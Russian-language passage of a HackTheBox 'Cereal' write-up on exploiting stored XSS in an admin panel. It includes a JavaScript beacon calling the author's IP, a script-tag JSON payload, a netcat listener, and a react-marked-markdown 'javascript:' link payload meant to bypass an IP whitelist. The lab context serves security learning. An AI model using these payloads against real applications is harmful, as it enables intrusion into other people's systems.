# XSS в панели администратора

Мы не можем получить доступ к панели администратора, потому что она является авторизованной `PrivateRoute`. Однако мы видим, что на странице отображаются объекты запросов cereal, что может сделать её уязвимой к атаке кросс-сайтского скрипта.

```jsx
<div>
	{requestData &&
		<Card.Body>
			Description:{requestData.description}
			<br />
			Color:{requestData.color}
			<br />
			Flavor:{requestData.flavor}
		</Card.Body>
	}
</div>
```

Это предполагает, что существует имитация пользователя 'admin', который просматривает эту страницу. Такое случается иногда на HacktheBox, например, на устройстве Crossfit.

**Как мы можем использовать XSS?**

IP whitelist означает, что только сам устройство может отправлять запросы к определённым методам, включая уязвимый метод, который мы хотим атаковать. Если мы сможем заставить устройство отправить HTTP-запрос с помощью JavaScript, мы сможем обойти ограничение по IP.

**Примечание**

Когда я впервые попробовал этот устройство, я сначала не смог выполнить XSS, и вместо этого перешёл к тестированию десериализации. Я немного изменил порядок попыток в описании, так как такой подход стал более логичным, но, как всегда, вы можете перейти к [[30 - XSS#Fixing the XSS|правильному методу]] если не хотите читать о моих неудачных попытках.

## Попытка базового XSS

Мы создаём простый файл JavaScript `0.js`, который отправляет запрос к нашему устройству. Это просто для проверки, что мы можем запускать JavaScript на устройстве.

```javascript
var oReq = new XMLHttpRequest();
oReq.open("GET", "http://10.10.14.62/example.txt");
oReq.send();
```

Затем мы хотим отправить запрос к этому файлу JavaScript как скрипт в поле описания.

```javascript
<script src="10.10.14.62/0.js"></script>
```

Чтобы создать это, мы запускаем скрипт сортировки на следующем JSON:

```javascript
console.log(JSON.stringify({ JSON: JSON.stringify({title:'t',flavor:'f',color:'#FFF',description:'<script src="10.10.14.62/0.js"></script>' }) }))
```

Это создаёт наш Payload:

```json
{"JSON":"{\"title\":\"t\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"<script src=\\\"10.10.14.62/0.js\\\"></script>\"}"}
```

Мы могли бы использовать `XMLHTTPRequest()` в поле описания, но гораздо лучше отправить файл как источник скрипта — это делает payload короче и позволяет нам легко редактировать файл на устройстве.

Наша последняя настройка — запустить слушатель netcat, чтобы поймать запрос:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ sudo nc -lnvp 80
[sudo] password for mac: 
listening on [any] 80 ...
```

Затем мы отправляем payload и ждём ответа:

![[Pasted image 20210406101322.png]]

Мы не получаем ничего в ответе от netcat. Создание файла `0.html`, который локально запускает наш `0.js` скрипт, действительно даёт ответ, так что мы знаем, что `XMLHTTPRequest` работает и сервер настроен правильно:

![[Pasted image 20210406101542.png]]

Это указывает на то, что поле описания может не быть уязвимым в этом виде, или что-то предотвращает отправку внешних запросов устройством.

## Исправление XSS

Когда я впервые делал этот тест, я не был уверен, какие части payloadа не работают, пока не протестировал все вместе. Оказалось, что и обе части не работают. Но вместо того, чтобы писать это в хронологическом порядке и иметь неработающий XSS payload на половине описания, я перенес правильную CVE в эту секцию. Как всегда, вы можете перейти к концу [[35 - Exploit Chain#Submitting our Test Payload|рабочему payloadу]] если хотите.

### Обзор Markdown

Когда я снова посмотрел на код в `ClientApp/src/AdminPage/AdminPage.jsx`, я заметил что-то, чего раньше не видел:

![[Pasted image 20210607210839.png]]

Сначала я искал "markdown preview xss" в Google, но это дало мне некоторые [generические markdown XSS payloadы](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8). Они в конце концов не выглядели правильно — я подозревал, что если базовый `<script>` тег не работает на Hard устройстве, то не будет работать и [базовый скрипт тег, отображаемый markdown](https://github.com/JakobRPennington/InformationSecurity/blob/master/Payloads/md/XSS.md). Поэтому я посмотрел на источник элемента `MarkdownPreview` (`import { MarkdownPreview } from 'react-marked-markdown';`) и искал "react-marked-markdown xss" в Google.

Эта [сnyk статья](https://snyk.io/vuln/npm:react-marked-markdown:20180517) и соответствующий [git репозиторий](https://github.com/advisories/GHSA-m7qm-r2r5-f77q) показались более перспективными. Они описали proof of concept в поле `value` элемента `MarkdownPreview`:

```jsx
import React from 'react'
import ReactDOM from 'react-dom'
import { MarkdownPreview } from 'react-marked-markdown'

ReactDOM.render(
<MarkdownPreview
markedOptions={{ sanitize: true }}
value={'[XSS](javascript: alert`1`)'}
/>,
document.getElementById('root')
)
```

Наш `title` cereal вставляется в это поле! Так что теоретически мы можем создать один с заголовком, похожим на следующий:

```jsx
[mouldy cereal](javascript: var oReq = new XMLHttpRequest();oReq.open("GET", "http://localhost/requests?id=9");oReq.send();)
```

Чтобы проверить, что это работает, нам нужно перейти к следующему этапу — связать это с payloadом десериализации.

В общем, хорошо тестировать вещи локально перед отправкой в удалённое приложение, и я бы сделал это на реальном тестировании. Но поскольку это просто HTB и нет необходимости в opsec, я решил не возиться с созданием приложения локально.
